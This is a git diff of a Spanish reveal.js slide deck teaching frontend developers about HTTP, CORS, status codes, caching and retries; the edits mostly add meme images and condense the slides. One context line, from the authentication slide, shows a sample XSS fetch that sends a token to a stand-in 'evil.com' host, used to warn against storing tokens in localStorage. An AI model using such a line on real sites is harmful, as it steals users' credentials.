@@ -20,6 +20,15 @@
     .reveal .highlight-green { color: #a6e3a1; }
     .reveal .highlight-yellow { color: #f9e2af; }
     .reveal .highlight-blue { color: #89b4fa; }
+    /* Layout imagen lateral */
+    .reveal .img-right { display: grid; grid-template-columns: 1.2fr 0.8fr; gap: 1.5rem; align-items: center; text-align: left; }
+    .reveal .img-left { display: grid; grid-template-columns: 0.8fr 1.2fr; gap: 1.5rem; align-items: center; text-align: left; }
+    .reveal .img-right img, .reveal .img-left img { max-height: 320px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
+    .reveal .img-center { text-align: center; }
+    .reveal .img-center img { max-height: 280px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); margin-top: 1rem; }
+    .reveal .meme-slide { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .reveal .meme-slide img { max-height: 380px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
+    .reveal .meme-slide p { margin-top: 1rem; font-size: 0.8em; color: #a6adc8; }
   </style>
 </head>
 <body>
@@ -71,29 +80,23 @@
   <!-- 1.1 Modelo mental -->
   <section>
     <h2>El modelo mental incorrecto</h2>
-    <div class="two-col">
+    <div class="img-right">
       <div>
-        <h4 class="highlight-red">❌ Lo que crees que pasa</h4>
+        <h4 class="highlight-red">❌ Lo que crees</h4>
         <pre><code class="language-text">fetch(url) → JSON ✨</code></pre>
-        <p class="small">Magia. No sé qué pasa en medio. Si falla, googleo el error.</p>
+        <h4 class="highlight-green" style="margin-top:1rem;">✅ La realidad</h4>
+        <pre><code class="language-text">1. DNS → IP
+2. TCP handshake
+3. TLS handshake
+4. HTTP Request
+5. Server processing
+6. HTTP Response
+7. Parse body</code></pre>
+        <p class="small" style="margin-top:0.5rem;">Si no entiendes la cadena, <strong>debuggeas a ciegas</strong>.</p>
       </div>
-      <div>
-        <h4 class="highlight-green">✅ Lo que realmente pasa</h4>
-        <pre><code class="language-text">1. DNS Resolution (url → IP)
-2. TCP Connection (3-way handshake)
-3. TLS Handshake (si es HTTPS)
-4. HTTP Request (method + headers + body)
-5. Server Processing
-6. HTTP Response (status + headers + body)
-7. Browser parses body</code></pre>
-      </div>
+      <img src="assets/blind-fox.jpg" alt="Debuggeando a ciegas">
     </div>
-    <p class="small" style="margin-top:1rem;">
-      Cada paso puede fallar de forma diferente. Si no entiendes la cadena, debuggeas a ciegas.
-    </p>
   </section>
-
-  <!-- 1.2 Qué es HTTP -->
   <section>
     <h2>¿Qué es HTTP?</h2>
     <ul>
@@ -196,33 +199,24 @@ ETag: "abc123"                        ← Fingerprint del recurso (cache validat
   <!-- 1.7 Idempotencia -->
   <section>
     <h2>Idempotencia — ¿Por qué te importa?</h2>
-    <div class="two-col">
+    <div class="img-right">
       <div>
-        <h4 class="highlight-green">✅ Idempotente = Safe de reintentar</h4>
+        <h4 class="highlight-green">✅ Safe de reintentar</h4>
         <ul class="small">
-          <li><strong>GET /products</strong> — leer 10 veces = mismo resultado</li>
-          <li><strong>PUT /products/1</strong> — enviar 10 veces = mismo estado final</li>
-          <li><strong>DELETE /products/1</strong> — borrar algo ya borrado = OK (404 o 204)</li>
+          <li><strong>GET</strong> — leer 10 veces = mismo resultado</li>
+          <li><strong>PUT</strong> — enviar 10 veces = mismo estado</li>
+          <li><strong>DELETE</strong> — borrar ya borrado = OK</li>
         </ul>
-        <p class="small">→ Tu retry interceptor puede reintentar estos sin miedo</p>
-      </div>
-      <div>
-        <h4 class="highlight-red">❌ NO idempotente = Peligro al reintentar</h4>
+        <h4 class="highlight-red" style="margin-top:0.8rem;">❌ Peligro al reintentar</h4>
         <ul class="small">
-          <li><strong>POST /orders</strong> — enviar 2 veces = 2 órdenes creadas</li>
-          <li><strong>POST /payments</strong> — reintentar = cobrar doble</li>
-          <li>Double-click en "Comprar" = problema real</li>
+          <li><strong>POST /orders</strong> — 2 veces = 2 órdenes</li>
+          <li><strong>POST /payments</strong> — cobrar doble 💸</li>
         </ul>
-        <p class="small">→ NUNCA reintentar POST automáticamente</p>
+        <p class="small" style="margin-top:0.5rem;">Todos evitamos las dobles peticiones... <strong>¿verdad, Craig?</strong></p>
       </div>
+      <img src="assets/verdad-craig.jpg" alt="Verdad Craig?">
     </div>
-    <p class="small" style="margin-top:1rem;">
-      <strong>Caso real:</strong> Usuario con internet lento. El POST tarda. El usuario hace click de nuevo.
-      Sin protección = 2 órdenes. Solución: disable button + idempotency key en el header.
-    </p>
   </section>
-
-  <!-- 1.8 Headers importantes -->
   <section>
     <h2>Headers que un Frontend Dev DEBE manejar</h2>
     <table>
@@ -247,25 +241,28 @@ ETag: "abc123"                        ← Fingerprint del recurso (cache validat
   <!-- 1.9 CORS intro -->
   <section>
     <h2>🔒 CORS — Cross-Origin Resource Sharing</h2>
-    <h4>El error que todos googlean y nadie entiende</h4>
-    <ul>
-      <li><strong>Same-Origin Policy:</strong> El browser BLOQUEA requests a un origen diferente al tuyo</li>
-      <li><strong>Origen =</strong> protocolo + host + puerto (los 3 deben coincidir)</li>
-      <li><strong>CORS =</strong> Mecanismo donde el SERVER dice "acepto requests de este origen"</li>
-      <li><strong>Es SEGURIDAD</strong> — protege a tus usuarios de scripts maliciosos</li>
-    </ul>
-    <table style="margin-top:1rem;">
-      <thead><tr><th>Desde http://localhost:4200</th><th>¿Same Origin?</th><th>¿Por qué?</th></tr></thead>
-      <tbody>
-        <tr><td>http://localhost:4200/api/data</td><td class="highlight-green">✅ Sí</td><td>Mismo protocolo, host, puerto</td></tr>
-        <tr><td>http://localhost:3000/products</td><td class="highlight-red">❌ No</td><td>Puerto diferente (3000 ≠ 4200)</td></tr>
-        <tr><td>https://localhost:4200/api</td><td class="highlight-red">❌ No</td><td>Protocolo diferente (https ≠ http)</td></tr>
-        <tr><td>https://api.github.com/users</td><td class="highlight-red">❌ No</td><td>Host diferente</td></tr>
-      </tbody>
-    </table>
+    <div class="img-right">
+      <div>
+        <h4 class="highlight-yellow">El error que todos googlean</h4>
+        <ul class="small">
+          <li><strong>Same-Origin Policy:</strong> Browser BLOQUEA requests cross-origin</li>
+          <li><strong>Origen =</strong> protocolo + host + puerto</li>
+          <li><strong>CORS =</strong> El SERVER dice "acepto requests de este origen"</li>
+          <li><strong>Es SEGURIDAD</strong> — no es un bug</li>
+        </ul>
+        <table style="margin-top:0.5rem;">
+          <thead><tr><th>URL</th><th>Same Origin?</th></tr></thead>
+          <tbody>
+            <tr><td class="small">localhost:4200/api</td><td class="highlight-green">✅</td></tr>
+            <tr><td class="small">localhost:3000/products</td><td class="highlight-red">❌ puerto</td></tr>
+            <tr><td class="small">https://localhost:4200</td><td class="highlight-red">❌ protocolo</td></tr>
+            <tr><td class="small">api.github.com</td><td class="highlight-red">❌ host</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <img src="assets/angry-panda.gif" alt="Panda enojado por CORS">
+    </div>
   </section>
-
-  <!-- 1.10 CORS Simple vs Preflight -->
   <section>
     <h2>CORS — Simple Request vs Preflight</h2>
     <div class="two-col">
@@ -302,30 +299,24 @@ Server → Browser: 200</code></pre>
 
   <!-- 1.11 CORS Headers y soluciones -->
   <section>
-    <h2>CORS — Headers del Server y "Soluciones"</h2>
-    <h4>Headers que el SERVER debe enviar:</h4>
-    <pre><code class="language-http">Access-Control-Allow-Origin: http://localhost:4200  // o * para cualquiera
-Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
-Access-Control-Allow-Headers: Content-Type, Authorization
-Access-Control-Max-Age: 86400  // Cache del preflight por 24h (evita OPTIONS repetidos)</code></pre>
-    <div class="two-col" style="margin-top:1rem;">
+    <h2>CORS — "Soluciones"</h2>
+    <div class="img-left">
+      <img src="assets/cors-culpa.jpg" alt="La culpa es del backend">
       <div>
-        <h4 class="highlight-red">❌ "Soluciones" incorrectas</h4>
+        <h4 class="highlight-red">❌ Incorrectas</h4>
         <ul class="small">
-          <li><code>mode: "no-cors"</code> → opaque response, no puedes leer nada</li>
-          <li>Extensión de browser → solo para ti, no para usuarios</li>
-          <li>Proxy en dev → no funciona en producción</li>
-          <li>Desactivar seguridad del browser → nunca</li>
+          <li><code>mode: "no-cors"</code> → opaque response</li>
+          <li>Extensión de browser → solo para ti</li>
+          <li>Proxy en dev → no funciona en prod</li>
         </ul>
-      </div>
-      <div>
-        <h4 class="highlight-green">✅ Solución real</h4>
+        <h4 class="highlight-green" style="margin-top:0.8rem;">✅ Solución real</h4>
         <ul class="small">
-          <li>El BACKEND configura los headers CORS</li>
-          <li>En desarrollo: json-server ya los incluye</li>
-          <li>En producción: configurar en el API gateway/server</li>
-          <li>Tú como frontend NO puedes "arreglar" CORS</li>
+          <li>El BACKEND configura headers CORS</li>
+          <li>Tú como frontend NO lo "arreglas"</li>
         </ul>
+        <pre style="margin-top:0.5rem;"><code class="language-http small">Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET,POST,PUT,DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization</code></pre>
       </div>
     </div>
   </section>
@@ -368,21 +359,25 @@ Access-Control-Max-Age: 86400  // Cache del preflight por 24h (evita OPTIONS rep
   <!-- 2.2 2xx Success -->
   <section>
     <h2>2xx — Success (todo salió bien)</h2>
-    <table>
-      <thead><tr><th>Code</th><th>Nombre</th><th>Cuándo se usa</th><th>Acción en Frontend</th></tr></thead>
-      <tbody>
-        <tr><td>200</td><td>OK</td><td>GET exitoso, PUT/PATCH exitoso</td><td>Mostrar datos / confirmar update</td></tr>
-        <tr><td>201</td><td>Created</td><td>POST creó un recurso nuevo</td><td>Confirmar creación, leer Location header</td></tr>
-        <tr><td>204</td><td>No Content</td><td>DELETE exitoso, acción sin response body</td><td>Confirmar acción, NO intentar parsear body</td></tr>
-      </tbody>
-    </table>
-    <pre><code class="language-typescript">// Ejemplo: POST retorna 201 + Location header
-this.http.post('/api/products', newProduct, { observe: 'response' })
+    <div class="img-right">
+      <div>
+        <table>
+          <thead><tr><th>Code</th><th>Nombre</th><th>Acción</th></tr></thead>
+          <tbody>
+            <tr><td>200</td><td>OK</td><td>Mostrar datos</td></tr>
+            <tr><td>201</td><td>Created</td><td>Confirmar + Location header</td></tr>
+            <tr><td>204</td><td>No Content</td><td>Éxito sin body (DELETE)</td></tr>
+          </tbody>
+        </table>
+        <pre style="margin-top:0.5rem;"><code class="language-typescript small">this.http.post('/api/products', data,
+  { observe: 'response' })
   .subscribe(res => {
-    console.log(res.status);                    // 201
-    console.log(res.headers.get('Location'));    // /api/products/11
-    console.log(res.body);                      // { id: 11, name: ... }
+    res.status;              // 201
+    res.headers.get('Location'); // /api/products/11
   });</code></pre>
+      </div>
+      <img src="assets/noice-nice.gif" alt="Noice">
+    </div>
   </section>
 
   <!-- 2.3 4xx Client Errors -->
@@ -408,21 +403,25 @@ this.http.post('/api/products', newProduct, { observe: 'response' })
 
   <!-- 2.4 5xx Server Errors -->
   <section>
-    <h2>5xx — Server Errors (ELLOS la cagaron)</h2>
-    <table>
-      <thead><tr><th>Code</th><th>Nombre</th><th>Significado</th><th>Acción en Frontend</th></tr></thead>
-      <tbody>
-        <tr><td>500</td><td>Internal Server Error</td><td>Bug en el backend (excepción no manejada)</td><td>Log + mensaje genérico "intenta más tarde"</td></tr>
-        <tr><td>502</td><td>Bad Gateway</td><td>Proxy/LB no puede conectar al backend</td><td>Retry con backoff (puede ser transitorio)</td></tr>
-        <tr><td>503</td><td>Service Unavailable</td><td>Server sobrecargado o en mantenimiento</td><td>Retry con exponential backoff</td></tr>
-        <tr><td>504</td><td>Gateway Timeout</td><td>Backend no respondió a tiempo</td><td>Retry con backoff</td></tr>
-      </tbody>
-    </table>
-    <p class="small" style="margin-top:1rem;">
-      <strong>Diferencia clave:</strong> 4xx = reintentar NO ayuda (el request está mal).
-      5xx = reintentar PUEDE ayudar (el server puede recuperarse).
-      Tu retry interceptor debe distinguir esto.
-    </p>
+    <h2>5xx — Server Errors (ELLOS la cagaron) 💥</h2>
+    <div class="img-right">
+      <div>
+        <table>
+          <thead><tr><th>Code</th><th>Nombre</th><th>Acción</th></tr></thead>
+          <tbody>
+            <tr><td>500</td><td>Internal Error</td><td>Log + "intenta más tarde"</td></tr>
+            <tr><td>502</td><td>Bad Gateway</td><td>Retry con backoff</td></tr>
+            <tr><td>503</td><td>Unavailable</td><td>Retry con backoff</td></tr>
+            <tr><td>504</td><td>Gateway Timeout</td><td>Retry con backoff</td></tr>
+          </tbody>
+        </table>
+        <p class="small" style="margin-top:0.8rem;">
+          <strong>4xx</strong> = reintentar NO ayuda (tu request está mal)<br>
+          <strong>5xx</strong> = reintentar PUEDE ayudar (server puede recuperarse)
+        </p>
+      </div>
+      <img src="assets/burning-office-spongebob.gif" alt="Server en llamas">
+    </div>
   </section>
 
   <!-- 2.5 Anti-pattern vs Pattern -->
@@ -559,6 +558,9 @@ GET  /api/v1/fetchUserData</code></pre>
         La acción la define el HTTP method, no la URL.</p>
       </div>
     </div>
+    <div class="img-center">
+      <img src="assets/recursos-pooh.jpg" alt="Pooh leyendo la documentación">
+    </div>
   </section>
 
   <!-- 3.3 Paginación -->
@@ -627,24 +629,25 @@ this.http.get&lt;Task[]&gt;('/api/tasks', { params });</code></pre>
   <!-- 3.5 Caching -->
   <section>
     <h2>Caching en el Frontend</h2>
-    <h4>El GET más rápido es el que NO se hace</h4>
-    <table>
-      <thead><tr><th>Mecanismo</th><th>Cómo funciona</th><th>Quién lo maneja</th></tr></thead>
-      <tbody>
-        <tr><td><code>Cache-Control: max-age=3600</code></td><td>Browser cachea por 1 hora, no hace request</td><td>Browser automáticamente</td></tr>
-        <tr><td><code>ETag</code> + <code>If-None-Match</code></td><td>Browser pregunta "¿cambió?" → 304 Not Modified (sin body)</td><td>Browser + Server</td></tr>
-        <tr><td><code>stale-while-revalidate</code></td><td>Muestra cache viejo mientras revalida en background</td><td>Browser / Service Worker</td></tr>
-        <tr><td>TanStack Query / SWR</td><td>Cache en memoria con revalidación automática</td><td>Tu código (librería)</td></tr>
-      </tbody>
-    </table>
-    <pre><code class="language-typescript">// ETag flow:
-// 1. GET /products → Response: ETag: "v1-abc"
-// 2. GET /products + Header: If-None-Match: "v1-abc"
-//    → Si no cambió: 304 Not Modified (0 bytes body, ultra rápido)
-//    → Si cambió: 200 OK + nuevo body + nuevo ETag</code></pre>
-    <p class="small">
-      En Angular puedes implementar un interceptor de cache, o usar signals + un store que cachee responses.
-    </p>
+    <div class="img-right">
+      <div>
+        <h4 class="highlight-yellow">El GET más rápido es el que NO se hace</h4>
+        <table>
+          <thead><tr><th>Mecanismo</th><th>Cómo</th></tr></thead>
+          <tbody>
+            <tr><td><code>Cache-Control</code></td><td>Browser cachea N segundos</td></tr>
+            <tr><td><code>ETag</code></td><td>"¿Cambió?" → 304 (sin body)</td></tr>
+            <tr><td><code>stale-while-revalidate</code></td><td>Cache viejo + revalida en bg</td></tr>
+            <tr><td>TanStack Query</td><td>Cache en memoria + auto-revalidate</td></tr>
+          </tbody>
+        </table>
+        <pre style="margin-top:0.5rem;"><code class="language-text small">// ETag flow:
+GET /products → ETag: "v1-abc"
+GET /products + If-None-Match: "v1-abc"
+→ 304 Not Modified (0 bytes!)</code></pre>
+      </div>
+      <img src="assets/X5sf0i.gif" alt="Cache">
+    </div>
   </section>
 
   <!-- 3.6 Retry con Backoff -->
@@ -676,6 +679,9 @@ this.http.get&lt;Task[]&gt;('/api/tasks', { params });</code></pre>
       <li><strong>¿Por qué solo idempotentes?</strong> Reintentar POST puede crear duplicados</li>
       <li><strong>¿Por qué no 4xx?</strong> Si tu request está mal, enviarla de nuevo no la arregla</li>
     </ul>
+    <div class="img-center">
+      <img src="assets/retry-repito.jpg" alt="¡Repito!">
+    </div>
   </section>
 
   <!-- 3.7 Autenticación -->
@@ -733,6 +739,10 @@ fetch('https://evil.com/steal?token=' +
 private readonly token = signal&lt;string | null&gt;(null);
 // XSS no puede acceder a esto directamente</code></pre>
       </div>
+    </div>
+    <div class="img-center">
+      <img src="assets/tokens-reja.jpg" alt="localStorage = reja sin muro">
+      <p class="small">localStorage es como esta reja: parece seguro pero... 🤷</p>
     </div>
   </section>
 
